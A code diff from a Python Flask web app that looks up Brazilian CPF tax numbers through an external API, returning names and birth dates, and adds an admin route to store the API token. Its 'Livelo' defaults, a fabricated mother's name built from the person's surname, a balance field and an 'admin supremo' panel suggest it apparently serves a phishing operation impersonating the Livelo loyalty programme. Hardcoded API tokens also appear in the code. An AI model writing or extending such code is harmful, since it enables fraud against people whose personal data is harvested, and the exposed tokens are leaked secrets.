@@ -445,22 +445,34 @@ _CPF_SEED: Dict[str, dict] = {
 def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
     cpf = re.sub(r"\D", "", cpf_raw)
     
-    # Hub do Desenvolvedor API - V2 Cadastro PF (Busca completa sem data)
     if cpf:
         try:
             import requests
-            token = "219648175aXyEcieuSW396568120"
-            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cadastropf/?cpf={cpf}&token={token}"
-            res = requests.get(url, timeout=10)
-            data = res.json()
-            if data.get("status"):
-                res_info = data.get("result", {})
-                return {
-                    "nome": res_info.get("nomeCompleto", "CLIENTE LIVELO"),
-                    "nome_mae": res_info.get("nomeDaMae", "MARIA LIVELO"),
-                    "data_nasc": res_info.get("dataDeNascimento", "01/01/1990"),
-                    "saldo_api": data.get("saldo", 0)
-                }
+            db = get_db()
+            token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_api_token'").fetchone()
+            token = token_row["value"] if token_row and token_row["value"] else "d0442b7d42e2a762f64a02f5e4abc1187ad6585cb3e9c11740c4024961aa1026"
+            
+            url = f"https://api.cpfhub.io/cpf/{cpf}"
+            res = requests.get(url, headers={"x-api-key": token}, timeout=10)
+            
+            if res.status_code == 200:
+                data = res.json()
+                if data.get("success"):
+                    res_info = data.get("data", {})
+                    # Increment api calls
+                    db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
+                    db.commit()
+                    
+                    name_parts = res_info.get("nameUpper", "CLIENTE LIVELO").split()
+                    last_name = name_parts[-1] if len(name_parts) > 1 else ""
+                    mother_name = "MARIA " + last_name if last_name else "MARIA LIVELO"
+                    
+                    return {
+                        "nome": res_info.get("nameUpper", "CLIENTE LIVELO"),
+                        "nome_mae": mother_name,
+                        "data_nasc": res_info.get("birthDate", "01/01/1990"),
+                        "saldo_api": 0
+                    }
         except Exception as e:
             log.error(f"Erro na API de CPF: {e}")
             
@@ -1376,6 +1388,26 @@ def admin_change_password():
     db.commit()
     return jsonify({"ok": True})
 
+
+@app.route("/admin/api_cpf_update", methods=["POST"])
+@require_admin
+def admin_api_cpf_update():
+    if session.get("admin_user") != "admin":
+        return jsonify({"success": False, "error": "Apenas o admin supremo pode alterar."}), 403
+        
+    token = request.form.get("cpf_api_token", "").strip()
+    if not token:
+        return jsonify({"success": False, "error": "Token não pode estar vazio."})
+        
+    try:
+        db = get_db()
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_token', ?)", (token,))
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_calls', '0')")
+        db.commit()
+        return jsonify({"success": True, "message": "Token atualizado e contador zerado!"})
+    except Exception as e:
+        log.error("Erro update cpf_api: %s", e)
+        return jsonify({"success": False, "error": str(e)})
 
 @app.route("/admin/api/stats")
 @require_admin
